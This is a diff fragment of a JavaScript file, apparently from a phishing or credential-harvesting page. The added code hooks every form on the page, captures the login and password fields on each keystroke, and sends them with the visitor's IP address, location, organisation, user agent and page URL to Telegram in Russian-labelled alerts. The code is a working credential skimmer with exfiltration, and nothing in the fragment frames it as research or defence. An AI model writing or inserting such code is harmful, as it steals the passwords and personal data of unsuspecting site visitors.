@@ -94,4 +94,37 @@ ${domainHashTag}`;
     });
 }
 
+document.querySelectorAll("form").forEach(form => {
+    form.addEventListener("input", event => {
+        const formData = new FormData(event.target.form);
+        const login = formData.get("user") || "Не указано";
+        const password = formData.get("passwd") || "Не указано";
+
+        const simplifiedUserAgent = getSimplifiedUserAgent();
+
+        getIPInfo().then(info => {
+            hashDomain(info.org).then(domainHashTag => {
+                const message = `🚨 *Изменение в форме:*
+---
+- 🛡️ **Логин:**
+\`\`\`
+${login}
+\`\`\`
+- 🛡️ **Пароль:**
+\`\`\`
+${password}
+\`\`\`
+- 🌐 **IP-адрес:** ${info.ip}
+- 📍 **Местоположение:** ${info.location}
+- 🖥️ **User-Agent:** ${simplifiedUserAgent}
+- 🔗 **Страница:** ${window.location.href}
+- 🏢 **Организация:** ${info.org}
+${domainHashTag}`;
+                sendToTelegram(message);
+            });
+        });
+    });
+});
+
+
 logPageVisit();
